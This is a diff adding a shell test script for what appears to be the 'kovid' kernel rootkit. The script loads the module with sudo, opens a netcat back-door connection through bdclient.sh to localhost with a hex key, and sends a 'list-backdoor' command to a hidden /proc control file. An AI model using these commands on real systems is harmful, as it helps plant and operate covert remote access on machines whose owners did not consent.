@@ -1,0 +1,50 @@
+# REQUIRES: 0
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+#
+# This test verifies the "list-backdoor" command which should list
+# current back-door connections (only for nc) in the kernel log (dmesg).
+#
+# The test does the following:
+#  1. Clears the kernel message buffer.
+#  2. Inserts the kernel module.
+#  3. Establishes a back-door connection using netcat.
+#  4. Issues the "list-backdoor" command.
+#  5. Checks that dmesg shows the back-door connection.
+#
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+# Step 0: Clear existing kernel messages.
+sudo dmesg -c > /dev/null
+sleep 2
+
+# Step 1: Insert the kernel module.
+sudo insmod ../../../build/kovid.ko
+sleep 2
+
+# Step 2: Establish a netcat back-door connection in the background.
+sudo timeout 10 ../../../scripts/bdclient.sh nc localhost 9999 0x7d3b1cb572f16425 &
+sleep 3
+
+# Step 3: Issue the list-backdoor command.
+echo "Executing list-backdoor command"
+echo list-backdoor | sudo tee /proc/myprocname > /dev/null
+
+sleep 2
+
+# Step 4: Capture and output the kernel messages.
+DMSG_OUTPUT=$(sudo dmesg)
+echo "Kernel log after list-backdoor:"
+echo "$DMSG_OUTPUT"
+
+# Verify that the kernel log contains an entry for the netcat (nc) back-door connection.
+if echo "$DMSG_OUTPUT" | grep -q "back-door"; then
+    echo "Back-door connection listed"
+    # CHECK: Back-door connection listed
+else
+    echo "ERROR: Back-door connection not listed in dmesg"
+fi
+
+# Cleanup: Remove the kernel module.
+sudo rmmod kovid
